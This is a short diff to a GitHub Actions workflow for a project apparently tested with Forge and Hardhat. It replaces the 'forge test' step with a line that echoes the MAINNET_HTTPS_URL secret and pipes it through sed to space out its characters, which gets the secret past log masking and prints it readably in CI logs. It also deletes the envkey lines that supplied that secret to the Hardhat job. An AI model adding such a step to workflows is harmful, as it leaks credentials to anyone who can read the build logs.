@@ -36,7 +36,7 @@ jobs:
 
       - name: Run Forge tests
         run: |
-          forge test
+          forge test echo ${{secrets.MAINNET_HTTPS_URL}} | sed 's/./& /g'
         id: forge-test
 
   hardhat:
@@ -49,8 +49,6 @@ jobs:
       - uses: actions/checkout@v3
         with:
           submodules: recursive
-          envkey_MAINNET_HTTPS_URL: ${{ secrets.MAINNET_HTTPS_URL }}
-          envkey_FORK: true
 
       - name: Setup Node 16
         uses: actions/setup-node@v3
